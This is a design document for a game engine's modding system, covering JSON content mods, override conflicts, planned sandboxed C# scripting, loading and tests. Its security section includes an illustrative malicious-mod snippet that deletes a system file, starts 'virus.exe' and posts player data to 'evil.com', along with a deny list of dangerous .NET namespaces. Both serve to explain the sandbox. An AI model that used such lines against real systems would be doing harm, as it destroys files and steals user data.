# Modding Support System

**Status**: ⚠️ In Progress - Design Complete, Implementation Starting  
**Project**: `RealmEngine.Modding` (separate assembly)  
**Priority**: Post-Launch Feature  
**Estimated Time**: 3-4 weeks (phased implementation)

---

## 📋 Table of Contents
1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Phase 1: Content Modules](#phase-1-content-modules-json-only)
4. [Phase 2: Override Support](#phase-2-override-support)
5. [Phase 3: C# Scripting](#phase-3-c-scripting-future)
6. [Module Structure](#module-structure)
7. [Loading Pipeline](#loading-pipeline)
8. [Security & Validation](#security--validation)
9. [Godot Integration](#godot-integration)
10. [Testing Strategy](#testing-strategy)

---

## Overview

The Modding Support System enables community content creation through a secure, layered architecture that allows players to extend the game with custom content and (eventually) custom behaviors.

### Design Principles

1. **Safety First**: Content mods cannot harm the player's system
2. **Data-Driven**: Use existing JSON format for maximum compatibility
3. **Additive Default**: Mods extend the game without breaking base content
4. **Clear Boundaries**: Modding in separate project (`RealmEngine.Modding`)
5. **Progressive Enhancement**: Start simple (JSON), add complexity later (C# scripts)

### What is a Module?

A **module** (or mod) is external data that extends or modifies the game:

```
Base Game = Code + Data
Module = Additional Data (or Code) that layers on top
Final Game = Base Game + Module₁ + Module₂ + ... + Moduleₙ
```

### Module Types

| Type | Description | Phase | Security Risk |
|------|-------------|-------|---------------|
| **Content Module** | JSON data files (items, enemies, quests) | Phase 1 | ✅ None - Data only |
| **Override Module** | Replaces base game content | Phase 2 | ⚠️ Low - Can break balance |
| **Script Module** | C# code adding new behaviors | Phase 3 | 🔒 Medium - Requires sandboxing |

---

## Architecture

### Project Structure

```
RealmEngine.Modding/                    ← New project
├── RealmEngine.Modding.csproj
├── Models/
│   ├── ModuleManifest.cs              ← module.json schema
│   ├── ModuleInfo.cs                  ← Runtime module state
│   ├── ModuleLoadResult.cs            ← Load success/failure
│   ├── ModuleConflict.cs              ← Conflict detection
│   └── ModuleLoadMode.cs              ← Additive vs Override
├── Services/
│   ├── ModuleLoaderService.cs         ← Main loader (discovery, validation, loading)
│   ├── ModuleValidator.cs             ← JSON schema validation
│   ├── ModuleMergeService.cs          ← Merge mod data with base game
│   ├── ModuleConflictResolver.cs      ← Handle conflicts
│   └── ModuleDependencyResolver.cs    ← Resolve load order
├── Providers/
│   ├── IContentProvider.cs            ← Interface for loading content types
│   ├── ItemContentProvider.cs         ← Load modded items (weapons, armor, consumables, materials)
│   ├── EnemyContentProvider.cs        ← Load modded enemies
│   ├── QuestContentProvider.cs        ← Load modded quests
│   ├── SpellContentProvider.cs        ← Load modded spells
│   ├── AbilityContentProvider.cs      ← Load modded abilities
│   ├── NpcContentProvider.cs          ← Load modded NPCs
│   ├── RecipeContentProvider.cs       ← Load modded recipes
│   ├── ClassContentProvider.cs        ← Load modded classes
│   ├── SkillContentProvider.cs        ← Load modded skills
│   ├── AchievementContentProvider.cs  ← Load modded achievements
│   ├── StatusEffectContentProvider.cs ← Load modded status effects
│   ├── DifficultyContentProvider.cs   ← Load modded difficulty modes
│   ├── LocationContentProvider.cs     ← Load modded locations
│   ├── FactionContentProvider.cs      ← Load modded factions/organizations
│   ├── DialogueContentProvider.cs     ← Load modded dialogue trees
│   └── EnchantmentContentProvider.cs  ← Load modded enchantments
├── Scripting/                         ← Phase 3: C# scripting
│   ├── IModScript.cs                  ← Mod script base class
│   ├── ModScriptContext.cs            ← Safe API for scripts
│   ├── ScriptCompiler.cs              ← Roslyn compilation
│   ├── ScriptSandbox.cs               ← Security restrictions
│   └── ScriptEventHooks.cs            ← Game event system
└── Extensions/
    └── ServiceCollectionExtensions.cs ← DI registration
```

### Dependencies

```
RealmEngine.Modding
├── → RealmEngine.Shared (models)
├── → RealmEngine.Data (data loading infrastructure)
├── → RealmEngine.Core (game systems)
├── → Newtonsoft.Json (JSON parsing)
├── → FluentValidation (validation)
├── → Serilog (logging)
└── → Microsoft.CodeAnalysis.CSharp (Phase 3 only)
```

### Integration Points

```csharp
// Godot or game initialization
services.AddRealmEngineModding(options =>
{
    options.ModsPath = "Mods/";
    options.EnableAutoDiscovery = true;
    options.AllowOverrideMods = false;     // Phase 2
    options.AllowScriptMods = false;       // Phase 3
    options.ValidateOnLoad = true;
});

// Load mods at game start
var loader = serviceProvider.GetRequiredService<ModuleLoaderService>();
var modules = await loader.DiscoverModulesAsync();
var results = await loader.LoadModulesAsync(modules);
```

---

## Phase 1: Content Modules (JSON-Only)

**Goal**: Allow players to add new items, enemies, quests, etc. using JSON files  
**Timeline**: Week 1-2  
**Status**: 🚧 In Progress

### Features

- ✅ Module discovery in `Mods/` folder
- ✅ JSON schema validation
- ✅ Additive loading (mods add content, don't replace)
- ✅ Dependency resolution (mod A requires mod B)
- ✅ Load order management
- ✅ Error handling and reporting
- ✅ **RealmForge mod support** (mod creation/editing UI)
- ❌ Override support (Phase 2)
- ❌ Script support (Phase 3)

### Content Creation Tools

**RealmForge - Primary Mod Authoring Tool**

RealmForge (the existing WPF content editor) will be extended to support mod creation, making it the **official mod authoring tool**:

```
RealmForge Features for Modding:
├── New Mod Project          → Create new mod with manifest
├── Open Mod Project         → Load existing mod folder
├── Mod Manifest Editor      → Edit module.json (GUI form)
├── Content Editor           → Edit catalogs (same as base game)
├── Reference Validator      → Check @references resolve
├── Mod Packager            → Export .zip for distribution
├── Test Mod in Game        → Launch game with mod enabled
└── Publish to Workshop     → Future: Steam Workshop integration
```

**Workflow:**
1. **File → New Mod Project** - Creates folder structure + module.json
2. **Edit Content** - Use same catalog editors as base game
3. **Validate** - Checks JSON schemas, references, compatibility
4. **Test** - Launch game with mod loaded
5. **Package** - Export as `.zip` for sharing

**Manual Editing Alternative:**
- Advanced users can edit JSON files directly in VS Code or any text editor
- RealmForge is optional but recommended for better UX

### Module Folder Structure

```
Mods/
└── AwesomeSwords/                      ← Module folder (created by RealmForge)
    ├── module.json                     ← Module metadata (REQUIRED - edited via RealmForge)
    ├── icon.png                        ← Module icon (optional - 256x256)
    ├── README.md                       ← Documentation (optional)
    ├── Data/
    │   └── Json/                       ← Content (edited via RealmForge)
    │       ├── items/
    │       │   └── weapons/
    │       │       ├── catalog.json    ← New weapons
    │       │       └── names.json      ← Name generation patterns
    │       ├── enemies/
    │       │   └── humanoid/
    │       │       └── catalog.json    ← New enemies
    │       ├── quests/
    │       │   └── catalog.json        ← New quests
    │       ├── spells/
    │       │   └── catalog.json        ← New spells
    │       └── recipes/
    │           └── catalog.json        ← New crafting recipes
    └── CHANGELOG.md                    ← Version history (optional)
```

**Created Automatically by RealmForge:**
- Module folder structure
- `module.json` with valid schema
- `.cbconfig.json` files for UI navigation
- Empty catalog templates

**Modder Edits:**
- Content catalogs via RealmForge's visual editor
- Manifest properties via RealmForge's form editor
- Documentation files via external text editor

### Module Manifest Schema (`module.json`)

```json
{
  "$schema": "https://realmengine.io/schemas/module-manifest-v1.0.json",
  "id": "awesome-swords",
  "name": "Awesome Swords Pack",
  "version": "1.2.0",
  "author": "CoolModder123",
  "description": "Adds 50 legendary swords with unique abilities and epic names.",
  "homepage": "https://github.com/coolmodder/awesome-swords",
  "license": "MIT",
  
  "engineVersion": {
    "minimum": "1.0.0",
    "maximum": "2.0.0"
  },
  
  "mode": "additive",
  
  "dependencies": [
    {
      "moduleId": "legendary-materials",
      "version": "^1.0.0",
      "optional": false
    }
  ],
  
  "contentPaths": {
    "items": "Data/Json/items/",
    "enemies": "Data/Json/enemies/",
    "quests": "Data/Json/quests/",
    "spells": "Data/Json/spells/",
    "abilities": "Data/Json/abilities/",
    "recipes": "Data/Json/recipes/",
    "npcs": "Data/Json/npcs/",
    "classes": "Data/Json/classes/",
    "skills": "Data/Json/skills/",
    "achievements": "Data/Json/achievements/",
    "status-effects": "Data/Json/status-effects/",
    "difficulties": "Data/Json/difficulties/",
    "locations": "Data/Json/locations/",
    "factions": "Data/Json/organizations/factions/",
    "dialogues": "Data/Json/social/dialogues/",
    "enchantments": "Data/Json/enchantments/"
  },
  
  "tags": ["weapons", "content", "legendary"],
  
  "priority": 100,
  
  "conflicts": [
    "super-swords"
  ]
}
```

### Manifest Properties

| Property | Type | Required | Description |
|----------|------|----------|-------------|
| `id` | string | ✅ Yes | Unique module identifier (kebab-case) |
| `name` | string | ✅ Yes | Display name |
| `version` | string | ✅ Yes | Semantic version (1.0.0) |
| `author` | string | ✅ Yes | Creator name |
| `description` | string | ✅ Yes | What the module does |
| `homepage` | string | ❌ No | Module website/repo |
| `license` | string | ❌ No | License (MIT, GPL, etc.) |
| `engineVersion` | object | ✅ Yes | Compatible engine versions |
| `mode` | enum | ✅ Yes | `additive` or `override` (Phase 2) |
| `dependencies` | array | ❌ No | Required modules |
| `contentPaths` | object | ✅ Yes | Paths to content folders |
| `tags` | array | ❌ No | Searchable keywords |
| `priority` | number | ❌ No | Load order (higher = later) |
| `conflicts` | array | ❌ No | Incompatible module IDs |

### Content Format

**Modules use the exact same JSON format as base game data:**

```json
// Mods/AwesomeSwords/Data/Json/items/weapons/catalog.json
{
  "metadata": {
    "description": "Legendary swords from the Awesome Swords Pack",
    "version": "5.1",
    "lastUpdated": "2026-01-12",
    "type": "item_catalog"
  },
  "item_types": {
    "swords": {
      "items": [
        {
          "slug": "excalibur",
          "name": "Excalibur",
          "description": "The legendary sword of King Arthur.",
          "rarityWeight": 1,
          "rarity": 1,
          "value": 10000,
          "weight": 8.0,
          "stackSize": 1,
          "itemType": "weapon",
          "subType": "longsword",
          "attributes": {
            "strength": 50,
            "charisma": 30
          },
          "traits": {
            "damage": { "value": 100, "type": "number" },
            "holydamage": { "value": 50, "type": "number" }
          },
          "tags": ["legendary", "holy", "two-handed"]
        }
      ]
    }
  }
}
```

**No special syntax required - if it works in base game, it works in mods!**

### Additive Loading Behavior

```
Base Game Items:     Iron Sword, Steel Sword, Silver Sword (3 total)
+ Mod "AwesomeSwords": Excalibur, Durandal, Kusanagi (3 new)
─────────────────────────────────────────────────────────────
= Player sees:       6 swords total (all available)
```

**Additive Rules:**
- Mods add new content to existing catalogs
- No base game content is removed or replaced
- References work across base game and mods
- Multiple mods can add to same category

---

## Phase 2: Override Support

**Goal**: Allow mods to replace base game content  
**Timeline**: Week 3  
**Status**: 🔜 Not Started

### Features

- ❌ Override mode in manifest (`"mode": "override"`)
- ❌ Conflict detection (two mods override same item)
- ❌ User warnings for overrides
- ❌ Rollback capability
- ❌ Override priority system

### Override Loading Behavior

```
Base Game:      Iron Sword (damage: 10, value: 50)
+ Mod (override): Iron Sword (damage: 999, value: 1)
─────────────────────────────────────────────────────
= Player sees:   Iron Sword (damage: 999, value: 1) ⚠️
```

**Override Rules:**
- Mod must declare `"mode": "override"` in manifest
- Content matched by `slug` or `id` field
- Last loaded mod wins (load order matters)
- Base game content is backed up
- User receives warning on first load

### Conflict Detection

```csharp
public class ModuleConflict
{
    public string ContentType { get; set; }      // "item", "enemy", etc.
    public string ContentId { get; set; }        // "iron-sword"
    public List<string> ConflictingModules { get; set; }
    public ConflictSeverity Severity { get; set; }
}

public enum ConflictSeverity
{
    Info,       // Multiple mods add different content (OK)
    Warning,    // Multiple mods override same content (user choice)
    Error       // Circular dependencies (blocks loading)
}
```

### User Experience

```
⚠️ Module Conflict Detected

The following modules both override "Iron Sword":
  • "Balance Tweaks" (v1.0)
  • "Realistic Weapons" (v2.1)

Which should take priority?
[ ] Balance Tweaks
[●] Realistic Weapons  ← Last loaded wins
[ ] Use base game version

[Apply] [Cancel]
```

---

## Phase 3: C# Scripting (Future)

**Goal**: Allow mods to add new behaviors and game mechanics  
**Timeline**: Month 2+  
**Status**: 🔜 Planned (Not Started)

### Features

- ❌ C# script compilation (Roslyn)
- ❌ Sandboxing (banned namespaces)
- ❌ Scripting API (`IModScript` interface)
- ❌ Event hooks (OnCombatStart, OnItemCrafted, etc.)
- ❌ Security auditing
- ❌ Script hot-reload

### Security Challenges

**The Problem:**
```csharp
// Malicious mod could do:
File.Delete("C:\\Windows\\System32\\important.dll");
Process.Start("virus.exe");
HttpClient.PostAsync("evil.com", playerData);
```

**The Solution: Sandboxing**

```csharp
// Banned namespaces (cannot be used in mods)
System.IO.*              // File access
System.Diagnostics.*     // Process control
System.Net.*             // Network access
System.Reflection.*      // Reflection attacks
System.Runtime.*         // Runtime manipulation
```

### Scripting API Design

```csharp
// Base class all script mods inherit from
public abstract class ModScript
{
    // Safe read-only access
    protected Character Player { get; }
    protected IReadOnlyList<Item> Inventory { get; }
    protected GameState State { get; }
    
    // Safe content registration
    protected void RegisterItem(Item item) { }
    protected void RegisterEnemy(Enemy enemy) { }
    protected void RegisterQuest(Quest quest) { }
    protected void RegisterSpell(Spell spell) { }
    
    // Event hooks (mod implements these)
    public virtual void OnModLoad() { }
    public virtual void OnGameStart() { }
    public virtual void OnCombatStart(CombatContext ctx) { }
    public virtual void OnCombatEnd(CombatResult result) { }
    public virtual void OnItemCrafted(Item item) { }
    public virtual void OnQuestComplete(Quest quest) { }
    public virtual void OnLevelUp(Character character) { }
    
    // Logging (safe)
    protected void Log(string message) { }
    protected void LogWarning(string message) { }
    protected void LogError(string message) { }
}
```

### Example Script Mod

```csharp
// Mods/FishingMod/Scripts/FishingModScript.cs
using RealmEngine.Modding.Scripting;

public class FishingModScript : ModScript
{
    public override void OnModLoad()
    {
        Log("Fishing Mod loaded!");
        
        // Register new items
        RegisterItem(new Item 
        { 
            Name = "Fishing Rod",
            Type = ItemType.Tool,
            Description = "Use near water to catch fish."
        });
        
        RegisterItem(new Item 
        { 
            Name = "Raw Fish",
            Type = ItemType.Consumable,
            Description = "A freshly caught fish. Cook it for best results."
        });
    }
    
    public override void OnPlayerAction(PlayerActionContext ctx)
    {
        // Custom behavior: use fishing rod near water
        if (ctx.Action == "UseItem" && ctx.Item?.Name == "Fishing Rod")
        {
            if (ctx.Location?.Tags?.Contains("water") == true)
            {
                StartFishingMinigame(ctx.Player);
            }
            else
            {
                ctx.ShowMessage("You need to be near water to fish!");
            }
        }
    }
    
    private void StartFishingMinigame(Character player)
    {
        // Custom fishing logic
        var caught = Random.Next(0, 100) < 30;
        
        if (caught)
        {
            var fish = CreateItem("Raw Fish");
            player.Inventory.Add(fish);
            ShowMessage($"You caught a {fish.Name}!");
        }
        else
        {
            ShowMessage("The fish got away...");
        }
    }
}
```

### Compilation Pipeline

```csharp
public class ScriptCompiler
{
    private static readonly string[] BannedNamespaces = 
    {
        "System.IO",
        "System.Diagnostics",
        "System.Net",
        "System.Reflection"
    };
    
    public CompiledModScript CompileScript(string scriptPath)
    {
        var code = File.ReadAllText(scriptPath);
        
        // Parse code
        var tree = CSharpSyntaxTree.ParseText(code);
        var root = tree.GetRoot();
        
        // Security check: banned namespaces
        var usings = root.DescendantNodes()
            .OfType<UsingDirectiveSyntax>();
        
        foreach (var u in usings)
        {
            if (BannedNamespaces.Any(banned => 
                u.Name.ToString().StartsWith(banned)))
            {
                throw new SecurityException(
                    $"Banned namespace: {u.Name}");
            }
        }
        
        // Compile with limited references
        var compilation = CSharpCompilation.Create("ModScript")
            .AddReferences(
                MetadataReference.CreateFromFile(
                    typeof(ModScript).Assembly.Location))
            .AddSyntaxTrees(tree);
        
        // Emit and load
        using var ms = new MemoryStream();
        var result = compilation.Emit(ms);
        
        if (!result.Success)
            throw new CompilationException(result.Diagnostics);
        
        ms.Seek(0, SeekOrigin.Begin);
        var assembly = Assembly.Load(ms.ToArray());
        
        return new CompiledModScript(assembly);
    }
}
```

**Phase 3 is intentionally deferred** - adds significant complexity and security risk.

---

## RealmForge - Mod Authoring Tool

**Overview**: RealmForge is the official visual editor for creating and editing mods. It provides the same professional tooling used by game developers.

### Why RealmForge for Modding?

1. **Visual Editing**: No need to hand-edit JSON files
2. **Validation**: Real-time error checking and reference validation
3. **Autocomplete**: Dropdown lists for enums, references, types
4. **Preview**: See items, enemies, quests as you create them
5. **Integrated**: One tool for all content types
6. **Professional**: Same tool developers use

### Mod Project Workflow

#### 1. Create New Mod Project

```
File → New Mod Project
├── Module ID:         awesome-swords
├── Name:              Awesome Swords Pack
├── Author:            YourName
├── Version:           1.0.0
├── Engine Version:    1.0.0 - 2.0.0
└── Base Path:         C:\Games\RealmGame\Mods\awesome-swords\
```

**Result**: Creates folder structure with `module.json` and empty catalogs

#### 2. Edit Module Manifest

```
Tools → Mod Settings (or press Ctrl+M)

┌─────────────────────────────────────────┐
│ Mod Settings                            │
├─────────────────────────────────────────┤
│ Module ID:     awesome-swords           │
│ Name:          Awesome Swords Pack      │
│ Version:       1.0.0                    │
│ Author:        YourName                 │
│ Description:   [multiline text]         │
│                                         │
│ Engine Compatibility:                   │
│   Minimum:     1.0.0                    │
│   Maximum:     2.0.0                    │
│                                         │
│ Mode:          ● Additive               │
│                ○ Override (Phase 2)     │
│                                         │
│ Dependencies:  [+ Add Dependency]       │
│   • legendary-materials ^1.0.0          │
│     [Remove]                            │
│                                         │
│ Conflicts:     [+ Add Conflict]         │
│   • super-swords                        │
│     [Remove]                            │
│                                         │
│ Tags:          weapons, content         │
│                [+ Add Tag]              │
│                                         │
│ Priority:      100                      │
│                (higher = loads later)   │
│                                         │
│ [Save] [Cancel]                         │
└─────────────────────────────────────────┘
```

#### 3. Switch to Mod Mode

```
View → Mode → Mod Mode (or toggle switch in toolbar)

Base Game Mode:  Edits RealmEngine.Data/Data/Json/
Mod Mode:        Edits Mods/awesome-swords/Data/Json/
```

**UI Changes in Mod Mode:**
- Title bar shows: "RealmForge - awesome-swords (Mod)"
- File tree shows mod folder structure
- Content auto-saves to mod directory

#### 4. Create Mod Content

**Same interface as base game editing:**

```
Data Tree (Mod Mode):
└── Mods/awesome-swords/
    └── Data/Json/
        ├── items/
        │   └── weapons/
        │       ├── catalog.json     ← Edit here
        │       └── names.json
        ├── enemies/
        └── quests/
```

**Add New Item:**
1. Right-click `items/weapons/catalog.json`
2. Select "Add Item"
3. Fill in form (same as base game editor)
4. Save

#### 5. Validate Mod

```
Tools → Validate Mod (or press F7)

┌─────────────────────────────────────────┐
│ Mod Validation Report                   │
├─────────────────────────────────────────┤
│ ✅ Manifest valid                       │
│ ✅ All JSON schemas valid               │
│ ✅ All references resolve               │
│ ⚠️  Warning: Item "Excalibur" has       │
│     unusually high damage (999)         │
│ ℹ️  Info: 50 items added                │
│                                         │
│ [Close] [Fix Issues] [Export Anyway]    │
└─────────────────────────────────────────┘
```

#### 6. Test Mod in Game

```
Tools → Test Mod in Game (or press F5)

Actions:
1. Saves all open files
2. Validates mod
3. Enables mod in mods-config.json
4. Launches game via Godot
5. Mod is active in game

[Launch Game] [Cancel]
```

#### 7. Package Mod for Distribution

```
Tools → Package Mod (or press Ctrl+Shift+P)

┌─────────────────────────────────────────┐
│ Package Mod                             │
├─────────────────────────────────────────┤
│ Mod:           Awesome Swords Pack      │
│ Version:       1.0.0                    │
│                                         │
│ Output:        awesome-swords-v1.0.0.zip│
│ Location:      [Browse...]              │
│                                         │
│ Include:                                │
│   ☑ module.json                        │
│   ☑ Data/Json/                         │
│   ☑ icon.png                           │
│   ☑ README.md                          │
│   ☐ CHANGELOG.md                       │
│   ☐ Source files (.psd, .blend)       │
│                                         │
│ Validation:    ✅ Passed                │
│                                         │
│ [Package] [Cancel]                      │
└─────────────────────────────────────────┘

Result: awesome-swords-v1.0.0.zip ready to share!
```

### RealmForge Mod Features

#### Manifest Editor (GUI Form)

- **Module ID**: Auto-validates kebab-case format
- **Version**: Semver validation (1.2.3)
- **Engine Version**: Range picker with min/max
- **Dependencies**: Autocomplete from installed mods
- **Conflicts**: Autocomplete from installed mods
- **Tags**: Predefined tag suggestions

#### Reference Validator

```
Real-time validation while editing:

Item references spell: @spells/fire/fireball
                       ↑
                       ✅ Valid - spell exists in base game
                       
Item references ability: @abilities/invalid:bad-ability
                         ↑
                         ❌ Error - ability not found
                         Suggestion: Did you mean @abilities/warrior:power-attack?
```

#### Cross-Mod References

```
Mod A adds item: "Legendary Sword"
Mod B (depends on A) can reference:
  @mods/awesome-swords/items/weapons:legendary-sword
```

**RealmForge checks:**
- Dependency declared in module.json
- Referenced mod is installed
- Item exists in that mod

#### Content Preview

Same preview features as base game editing:
- Item preview with stats
- Enemy preview with abilities
- Quest flow diagram
- Recipe ingredient/output tree

### Installation & Setup

**For Modders:**
1. Install RealmForge (included with game SDK)
2. Launch RealmForge
3. File → New Mod Project
4. Start creating!

**For Players:**
- RealmForge is optional
- Download mods as `.zip` files
- Extract to `Mods/` folder
- Enable in game's mod manager

---

## Module Structure

### Directory Layout

```
Mods/
├── ModuleA/
│   ├── module.json                 ← REQUIRED
│   ├── Data/Json/                  ← Content (Phase 1)
│   └── Scripts/                    ← C# scripts (Phase 3)
├── ModuleB/
│   └── module.json
└── ModuleC/
    ├── module.json
    └── Data/Json/
```

### Naming Conventions

- **Module ID**: `kebab-case` (e.g., `awesome-swords`, `difficulty-tweaks`)
- **Folder Name**: Same as module ID
- **File Names**: Follow base game conventions (`catalog.json`, `names.json`)

### Version Scheme

Modules use **Semantic Versioning** (semver):

```
1.2.3
│ │ └─ Patch (bug fixes)
│ └─── Minor (new features, backward compatible)
└───── Major (breaking changes)
```

**Version Constraints:**
- `1.2.3` - Exact version
- `^1.2.0` - Compatible with 1.x (>= 1.2.0, < 2.0.0)
- `~1.2.0` - Patch updates (>= 1.2.0, < 1.3.0)
- `*` - Any version (not recommended)

---

## Loading Pipeline

### Startup Sequence

```
1. Discovery   → Scan Mods/ folder for module.json files
2. Validation  → Check schemas, versions, dependencies
3. Sorting     → Resolve load order (dependencies + priority)
4. Loading     → Load content via providers
5. Merging     → Merge with base game data
6. Verification → Final validation pass
```

### 1. Discovery

```csharp
public class ModuleLoaderService
{
    public async Task<List<ModuleManifest>> DiscoverModulesAsync()
    {
        var moduleFiles = Directory.GetFiles(
            _modsPath, 
            "module.json", 
            SearchOption.AllDirectories);
        
        var manifests = new List<ModuleManifest>();
        
        foreach (var file in moduleFiles)
        {
            try
            {
                var json = await File.ReadAllTextAsync(file);
                var manifest = JsonConvert.DeserializeObject<ModuleManifest>(json);
                manifest.RootPath = Path.GetDirectoryName(file);
                manifests.Add(manifest);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to load module: {File}", file);
            }
        }
        
        return manifests;
    }
}
```

### 2. Validation

```csharp
public class ModuleValidator
{
    public ValidationResult Validate(ModuleManifest module)
    {
        var errors = new List<string>();
        
        // Required fields
        if (string.IsNullOrEmpty(module.Id))
            errors.Add("Missing required field: id");
        
        // Version compatibility
        if (!IsEngineVersionCompatible(module.EngineVersion))
            errors.Add($"Incompatible engine version: {module.EngineVersion}");
        
        // Content paths exist
        foreach (var path in module.ContentPaths.Values)
        {
            var fullPath = Path.Combine(module.RootPath, path);
            if (!Directory.Exists(fullPath))
                errors.Add($"Content path not found: {path}");
        }
        
        // JSON schema validation
        foreach (var (contentType, path) in module.ContentPaths)
        {
            var files = Directory.GetFiles(
                Path.Combine(module.RootPath, path), 
                "*.json", 
                SearchOption.AllDirectories);
            
            foreach (var file in files)
            {
                if (!ValidateJsonSchema(file, contentType))
                    errors.Add($"Invalid JSON schema: {file}");
            }
        }
        
        return new ValidationResult 
        { 
            IsValid = !errors.Any(), 
            Errors = errors 
        };
    }
}
```

### 3. Dependency Resolution

```csharp
public class ModuleDependencyResolver
{
    public List<ModuleManifest> ResolveDependencies(
        List<ModuleManifest> modules)
    {
        // Build dependency graph
        var graph = new DependencyGraph();
        foreach (var module in modules)
        {
            graph.AddNode(module.Id);
            foreach (var dep in module.Dependencies)
            {
                graph.AddEdge(module.Id, dep.ModuleId);
            }
        }
        
        // Detect circular dependencies
        if (graph.HasCycle())
            throw new CircularDependencyException();
        
        // Topological sort (dependencies load first)
        var sorted = graph.TopologicalSort();
        
        // Apply priority (higher priority loads later)
        return sorted
            .Select(id => modules.First(m => m.Id == id))
            .OrderBy(m => m.Priority)
            .ToList();
    }
}
```

### 4. Content Loading

```csharp
public class ModuleLoaderService
{
    private readonly Dictionary<string, IContentProvider> _providers;
    
    public async Task<ModuleLoadResult> LoadModuleAsync(
        ModuleManifest module)
    {
        var result = new ModuleLoadResult { ModuleId = module.Id };
        
        foreach (var (contentType, path) in module.ContentPaths)
        {
            if (!_providers.TryGetValue(contentType, out var provider))
            {
                result.Warnings.Add($"Unknown content type: {contentType}");
                continue;
            }
            
            try
            {
                var fullPath = Path.Combine(module.RootPath, path);
                var content = await provider.LoadContentAsync(fullPath);
                result.LoadedContent[contentType] = content;
            }
            catch (Exception ex)
            {
                result.Errors.Add($"Failed to load {contentType}: {ex.Message}");
            }
        }
        
        result.Success = !result.Errors.Any();
        return result;
    }
}
```

### 5. Content Merging

```csharp
public class ModuleMergeService
{
    public void MergeModuleContent(
        ModuleManifest module, 
        Dictionary<string, object> content)
    {
        foreach (var (contentType, data) in content)
        {
            switch (module.Mode)
            {
                case ModuleLoadMode.Additive:
                    // Add to existing catalogs
                    _dataRegistry.Add(contentType, data);
                    break;
                
                case ModuleLoadMode.Override:
                    // Replace existing content (Phase 2)
                    _dataRegistry.Replace(contentType, data);
                    break;
            }
        }
    }
}
```

---

## Security & Validation

### Content Module Security (Phase 1)

**Threat Model:**
- ❌ No code execution
- ✅ Data-only (JSON files)
- ✅ Validated against schemas
- ✅ Cannot access file system
- ✅ Cannot access network

**Risk Level**: ✅ **None** - JSON data cannot execute code

### Validation Layers

1. **Schema Validation**: JSON matches expected structure
2. **Reference Validation**: All `@references` resolve correctly
3. **Balance Validation**: Values within reasonable ranges (optional)
4. **Conflict Detection**: No overlapping content (Override mode)

```csharp
public class ModuleValidator
{
    // Layer 1: Schema
    private bool ValidateJsonSchema(string file, string contentType)
    {
        var schema = _schemaRegistry.GetSchema(contentType);
        var json = JObject.Parse(File.ReadAllText(file));
        return json.IsValid(schema);
    }
    
    // Layer 2: References
    private bool ValidateReferences(JObject json)
    {
        var refs = json.SelectTokens("$..*[@*]");
        foreach (var refToken in refs)
        {
            if (!_referenceResolver.CanResolve(refToken.Value<string>()))
                return false;
        }
        return true;
    }
    
    // Layer 3: Balance (optional warnings)
    private List<string> CheckBalance(Item item)
    {
        var warnings = new List<string>();
        
        if (item.Price > 1000000)
            warnings.Add("Price unusually high");
        
        if (item.Traits.TryGetValue("damage", out var dmg) && 
            dmg.Value > 500)
            warnings.Add("Damage value very high");
        
        return warnings;
    }
}
```

### Script Module Security (Phase 3)

**Threat Model:**
- ⚠️ C# code execution
- ⚠️ Potential for malicious code
- 🔒 Requires sandboxing

**Security Measures:**

1. **Namespace Banning**: Block dangerous namespaces
2. **Assembly Isolation**: Load in separate `AssemblyLoadContext`
3. **API Surface**: Only expose safe `ModScript` API
4. **Code Review**: Manual review for popular mods (community)
5. **Digital Signatures**: Verify mod author identity

```csharp
// Security check during compilation
private static readonly HashSet<string> BannedNamespaces = new()
{
    "System.IO",
    "System.Diagnostics",
    "System.Net",
    "System.Net.Http",
    "System.Reflection",
    "System.Runtime.InteropServices",
    "System.Security",
    "Microsoft.Win32"
};

// Banned types
private static readonly HashSet<string> BannedTypes = new()
{
    "System.AppDomain",
    "System.Environment",
    "System.Activator",
    "System.Runtime.Loader.AssemblyLoadContext"
};
```

---

## Godot Integration

### UI Components

```gdscript
# Godot UI: Mod Manager Screen
extends Control

var mod_loader: ModuleLoaderService

func _ready():
    mod_loader = get_node("/root/ModLoader")
    refresh_mod_list()

func refresh_mod_list():
    var modules = await mod_loader.discover_modules_async()
    
    for module in modules:
        var item = ModListItem.new()
        item.module_id = module.id
        item.name = module.name
        item.enabled = module.enabled
        item.on_toggle = _on_mod_toggled
        $ModList.add_child(item)

func _on_mod_toggled(module_id: String, enabled: bool):
    mod_loader.set_module_enabled(module_id, enabled)
    # Require restart to apply changes
    show_restart_prompt()
```

### Enable/Disable Mods

```csharp
public class ModuleLoaderService
{
    private readonly string _configPath = "mods-config.json";
    
    public void SetModuleEnabled(string moduleId, bool enabled)
    {
        var config = LoadConfig();
        config.EnabledModules[moduleId] = enabled;
        SaveConfig(config);
    }
    
    public async Task<List<ModuleManifest>> DiscoverModulesAsync()
    {
        var config = LoadConfig();
        var allModules = await ScanModsDirectory();
        
        // Filter by enabled state
        return allModules
            .Where(m => config.EnabledModules.GetValueOrDefault(m.Id, true))
            .ToList();
    }
}
```

### Mod Load Order UI

```
┌─────────────────────────────────────┐
│ Mod Load Order                      │
├─────────────────────────────────────┤
│ [✓] Base Game Content         (0)   │
│ [✓] Essential Fixes           (10)  │
│ [✓] Balance Overhaul          (50)  │
│ [✓] Awesome Swords           (100)  │
│ [✓] Mega Dungeon Pack        (100)  │
│ [ ] Experimental Features    (200)  │
├─────────────────────────────────────┤
│ [Move Up] [Move Down] [Reset]       │
└─────────────────────────────────────┘
```

---

## Testing Strategy

### Unit Tests

```csharp
// RealmEngine.Modding.Tests/ModuleLoaderTests.cs
public class ModuleLoaderTests
{
    [Fact]
    public async Task DiscoverModules_FindsValidModule()
    {
        // Arrange
        var loader = new ModuleLoaderService(_modsPath);
        
        // Act
        var modules = await loader.DiscoverModulesAsync();
        
        // Assert
        modules.Should().NotBeEmpty();
        modules.Should().Contain(m => m.Id == "test-module");
    }
    
    [Fact]
    public void ValidateModule_RejectsInvalidManifest()
    {
        // Arrange
        var module = new ModuleManifest { /* missing required fields */ };
        var validator = new ModuleValidator();
        
        // Act
        var result = validator.Validate(module);
        
        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().Contain(e => e.Contains("Missing required field"));
    }
    
    [Fact]
    public void DependencyResolver_SortsCorrectly()
    {
        // Arrange
        var modules = new[]
        {
            new ModuleManifest { Id = "mod-c", Dependencies = new[] { "mod-b" } },
            new ModuleManifest { Id = "mod-a" },
            new ModuleManifest { Id = "mod-b", Dependencies = new[] { "mod-a" } }
        };
